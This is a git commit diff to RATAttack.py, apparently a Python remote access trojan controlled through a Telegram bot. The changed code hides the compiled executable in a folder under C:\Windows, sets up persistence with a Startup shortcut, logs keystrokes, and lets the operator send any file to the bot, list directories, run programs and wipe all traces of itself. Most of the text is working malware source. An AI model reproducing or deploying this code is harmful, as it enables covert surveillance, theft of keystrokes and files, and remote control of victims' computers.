48d8160ed170089e776cd5b05fdbb734fbd559e0
Ritiek Malhotra <Ritiek@users.noreply.github.com>
2017-04-16 15:45:28 +0530

    Compiled form is now more customizable

--- RATAttack.py
+++ RATAttack.py
@@ -2,8 +2,8 @@
 
 from PIL import ImageGrab
 from time import strftime, sleep
-from shutil import copyfile, copyfileobj
-from sys import argv
+from shutil import copyfile, copyfileobj, rmtree
+from sys import argv, path
 from json import loads
 from winshell import startup
 from tendo import singleton
@@ -20,27 +20,35 @@ def checkchat_id(chat_id):
 	# REPLACE '123456' WITH YOUR ACTUAL chat_id!
 	known_ids = ['123456']
 	# COMMENT THE LINE 'return True'!
-	return True
+	#return True
 	try:
 		return str(chat_id) in known_ids
 	except:
 		return str(chat_id) == known_ids
-		
-win_folder = os.environ['WINDIR'] 
-hide_location = win_folder + '\\' + 'portal.exe'
-target_file = startup() + '\\portal.lnk'
 
 if (argv[0]).endswith('.exe'):
-	copyfile(argv[0], hide_location)
+	win_folder = os.environ['WINDIR']	# = 'C:\Windows'
+	# HIDING OPTIONS
+	# ---------------------------------------------
+	hide_folder = win_folder + r'\Portal'	# = 'C:\Windows\Portal'
+	compiled_name = 'portal.exe'	# Name of compiled .exe to hide in hide_folder
+	# ---------------------------------------------
+	if not os.path.exists(hide_folder):
+		os.makedirs(hide_folder)
+	hide_compiled = hide_folder + '\\' + compiled_name
+	target_shortcut = startup() + '\\' + compiled_name.replace('.exe', '.lnk')
+	copyfile(argv[0], hide_compiled)
 	shell = Dispatch('WScript.Shell')
-	shortcut = shell.CreateShortCut(target_file)
-	shortcut.Targetpath = hide_location
-	shortcut.WorkingDirectory = win_folder
+	shortcut = shell.CreateShortCut(target_shortcut)
+	shortcut.Targetpath = hide_compiled
+	shortcut.WorkingDirectory = hide_folder
 	shortcut.save()
+else:
+	hide_folder = path[0]
 
 initi = False
 user = os.environ.get("USERNAME")	# Windows username
-log_file = win_folder + '\\keylogs.txt'	# name of log file
+log_file = hide_folder + '\\keylogs.txt'
 with open(log_file, "a") as writing:
 	writing.write("-------------------------------------------------\n")
 	writing.write(user + " Log: " + strftime("%b %d@%H:%M") + "\n")
@@ -55,7 +63,7 @@ def pressed_chars(event):	# on key pressed function
 		f.write("[TAB]")
         if event.Ascii == 13:	# if char is "backspace"
             f.write("[ENTER]\n")
-        f.write(char)	# write every char pressed
+        f.write(char)	# write the char pressed
 
 def handle(msg):
 	chat_id = msg['chat']['id']
@@ -86,8 +94,9 @@ def handle(msg):
 					info += '\n' + pc_info
 				bot.sendMessage(chat_id, info)
 
-			elif command.startswith('/msg_box '):
-				message = command.replace('/msg_box ', '')
+			elif command.startswith('/msg_box'):
+				message = command.replace('/msg_box', '')
+				message = message[1:]
 				if message == '':
 					bot.sendMessage(chat_id, '/msg_box yourText')
 				else:
@@ -102,43 +111,43 @@ def handle(msg):
 				bot.sendLocation(chat_id, location[0], location[1])
 
 			elif command.startswith('/download_file'):
-				path = command.replace('/download_file', '')
-				path = path[1:]
-				if path == '':
+				path_file = command.replace('/download_file', '')
+				path_file = path_file[1:]
+				if path_file == '':
 					bot.sendChatAction(chat_id, 'typing')
 					bot.sendMessage(chat_id, '/download_file C:/path/to/file')
 				else:
 					try:
 						bot.sendChatAction(chat_id, 'upload_document')
-						bot.sendDocument(chat_id, open(path, 'rb'))
+						bot.sendDocument(chat_id, open(path_file, 'rb'))
 					except:
 						bot.sendMessage(chat_id, 'Could not find file')
 
 			elif command.startswith('/list_dir'):
 				bot.sendChatAction(chat_id, 'typing')
-				path = command.replace('/list_dir', '')
-				path = path[1:]
-				if path == '':
+				path_dir = command.replace('/list_dir', '')
+				path_dir = path_dir[1:]
+				if path_dir == '':
 					bot.sendMessage(chat_id, '/list_dir C:/path/to/folder')
 				else:
 					try:
-						files = os.listdir(path)
+						files = os.listdir(path_dir)
 						human_readable = ''
 						for file in files:
 							human_readable += file + '\n'
-						human_readable += human_readable + '\n^Contents of ' + path
+						human_readable += human_readable + '\n^Contents of ' + path_dir
 						bot.sendMessage(chat_id, human_readable)
 					except:
 						bot.sendMessage(chat_id, 'Invalid path')
 
 			elif command.startswith('/run_file'):
 				bot.sendChatAction(chat_id, 'typing')
-				path = command.replace('/run_file', '')
-				path = path[1:]
-				if path == '':
+				path_file = command.replace('/run_file', '')
+				path_file = path_file[1:]
+				if path_file == '':
 					bot.sendMessage(chat_id, '/run_file C:/path/to/file')
 				else:
-					os.startfile(path)
+					os.startfile(path_file)
 					bot.sendMessage(chat_id, 'Command executed')
 
 			elif command == '/self_destruct':
@@ -150,12 +159,10 @@ def handle(msg):
 			elif command == 'DESTROYNOW!' and initi == True:
 				bot.sendChatAction(chat_id, 'typing')
 				bot.sendMessage(chat_id, "DESTROYING ALL TRACES! POOF!")
-				if os.path.isfile(hide_location):
-					os.remove(hide_location)
-				if os.path.isfile(target_file):
-					os.remove(target_file)
-				if os.path.isfile(log_file):
-					os.remove(log_file)
+				if os.path.exists(hide_folder):
+					rmtree(hide_folder)
+				if os.path.isfile(target_shortcut):
+					os.remove(target_shortcut)
 				while True:
 					sleep(10)
 		else:
@@ -164,7 +171,7 @@ def handle(msg):
 			file_path = bot.getFile(file_id=file_id)['file_path']
 			link = 'https://api.telegram.org/file/bot' + str(token) + '/' + file_path
 			file = (requests.get(link, stream=True)).raw
-			with open(file_name, 'wb') as out_file:
+			with open(hidden_folder + file_name, 'wb') as out_file:
 				copyfileobj(file, out_file)
 
 bot = telepot.Bot(token)
